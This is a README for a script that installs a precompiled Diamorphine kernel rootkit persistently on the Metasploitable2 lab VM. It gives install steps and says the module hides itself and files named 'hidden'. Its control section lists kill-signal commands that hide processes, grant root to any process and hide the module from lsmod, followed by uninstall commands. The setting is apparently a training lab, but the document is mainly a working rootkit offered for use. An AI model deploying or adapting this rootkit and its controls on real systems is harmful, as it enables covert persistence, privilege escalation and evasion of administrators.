# msrootkit
Metasploitable Rootkit 

This script will make a hidden folder in the current working directory.  It will install a precompiled Diamorphine rootkit persistently on Metasploitable2.  To read the script part you can head -n 37 of the downloaded script.   

## Install   
Transfer script to metasploitable2

chmod +x script

As root run ./script     


## Features
If you run an ls you will see there is no folder named hidden. You can then `cd hidden` to be in the folder the kernel rootkit was hiding. The rootkit is configured to hide itself and any file that start with the word hidden.

The module itself is installed in /lib/modules/2.6.24-16-server/kernel/drivers/hidden

## Control 
`kill -31 PID` ; will hide the process 

`kill -64 PID` ;  makes the process become root; 
kill -64 $$ ; will give you root in a normal shell

`kill -63 ANYPID` ; will hide and unhide module from lsmod


## Uninstall
Delete your hidden directory and as root run the below commands.

`rm -rf /lib/modules/2.6.24-16-server/kernel/drivers/hidden/`

`head -n -1 /etc/modules | sudo tee /etc/modules`

`reboot`

